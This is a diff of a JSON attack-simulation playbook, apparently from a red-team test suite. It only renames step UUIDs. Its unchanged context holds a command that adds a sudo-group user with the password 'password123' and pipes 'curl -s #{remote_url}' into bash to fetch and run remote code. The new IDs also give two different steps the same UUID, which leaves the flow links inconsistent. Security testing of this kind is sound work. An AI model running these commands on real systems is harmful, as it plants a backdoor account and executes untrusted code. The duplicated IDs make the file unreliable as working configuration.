@@ -7,7 +7,7 @@
   ],
   "steps": [
     {
-      "id": "12e640a1-d43c-407a-9c83-63fe0725bd42",
+      "id": "d30b385d-0a11-54b2-9ee6-6c89cf874b7b",
       "type": "execute-command",
       "data": {
         "command": "useradd -G sudo -s /bin/bash -p $(openssl passwd -1 password123) art\nsu art\ncd /tmp\ncurl -s #{remote_url} |bash",
@@ -16,7 +16,7 @@
       "elevation_required": true
     },
     {
-      "id": "45450dad-07d5-41ca-a289-212696ef800b",
+      "id": "2083b17d-1e8e-508a-aba4-f02477185513",
       "type": "execute-command",
       "data": {
         "command": "userdel -fr art",
@@ -25,7 +25,7 @@
       "elevation_required": true
     },
     {
-      "id": "d9d0ea2a-87b8-4e5c-a696-4dd9dc575124",
+      "id": "62efeb75-1991-57ab-b236-f648104481bf",
       "name": "Check dependency 1/1",
       "description": "Check if running on a Debian based machine.\n",
       "type": "execute-command",
@@ -36,7 +36,7 @@
       "elevation_required": true
     },
     {
-      "id": "412bb760-a925-4cdc-9936-9a9df16eee8b",
+      "id": "d8dcf76a-1e7f-55fc-a2ed-6253cbecd60c",
       "name": "Resolve dependency 1/1",
       "description": "Check if running on a Debian based machine.\n",
       "type": "execute-command",
@@ -47,7 +47,7 @@
       "elevation_required": true
     },
     {
-      "id": "97d41b62-a44a-4c0c-a7ec-8aa2cce85ee9",
+      "id": "62efeb75-1991-57ab-b236-f648104481bf",
       "name": "Re-check dependency 1/1",
       "description": "Check if running on a Debian based machine.\n",
       "type": "execute-command",
@@ -60,34 +60,34 @@
   ],
   "flows": [
     {
-      "s": "12e640a1-d43c-407a-9c83-63fe0725bd42",
+      "s": "d30b385d-0a11-54b2-9ee6-6c89cf874b7b",
       "p": "on-success",
-      "o": "45450dad-07d5-41ca-a289-212696ef800b"
+      "o": "2083b17d-1e8e-508a-aba4-f02477185513"
     },
     {
-      "s": "12e640a1-d43c-407a-9c83-63fe0725bd42",
+      "s": "d30b385d-0a11-54b2-9ee6-6c89cf874b7b",
       "p": "on-failure",
-      "o": "45450dad-07d5-41ca-a289-212696ef800b"
+      "o": "2083b17d-1e8e-508a-aba4-f02477185513"
     },
     {
-      "s": "d9d0ea2a-87b8-4e5c-a696-4dd9dc575124",
+      "s": "62efeb75-1991-57ab-b236-f648104481bf",
       "p": "on-success",
-      "o": "12e640a1-d43c-407a-9c83-63fe0725bd42"
+      "o": "d30b385d-0a11-54b2-9ee6-6c89cf874b7b"
     },
     {
-      "s": "d9d0ea2a-87b8-4e5c-a696-4dd9dc575124",
+      "s": "62efeb75-1991-57ab-b236-f648104481bf",
       "p": "on-failure",
-      "o": "412bb760-a925-4cdc-9936-9a9df16eee8b"
+      "o": "d8dcf76a-1e7f-55fc-a2ed-6253cbecd60c"
     },
     {
-      "s": "412bb760-a925-4cdc-9936-9a9df16eee8b",
+      "s": "d8dcf76a-1e7f-55fc-a2ed-6253cbecd60c",
       "p": "on-success",
-      "o": "97d41b62-a44a-4c0c-a7ec-8aa2cce85ee9"
+      "o": "62efeb75-1991-57ab-b236-f648104481bf"
     },
     {
-      "s": "97d41b62-a44a-4c0c-a7ec-8aa2cce85ee9",
+      "s": "62efeb75-1991-57ab-b236-f648104481bf",
       "p": "on-failure",
-      "o": "12e640a1-d43c-407a-9c83-63fe0725bd42"
+      "o": "d30b385d-0a11-54b2-9ee6-6c89cf874b7b"
     }
   ],
   "tags": [
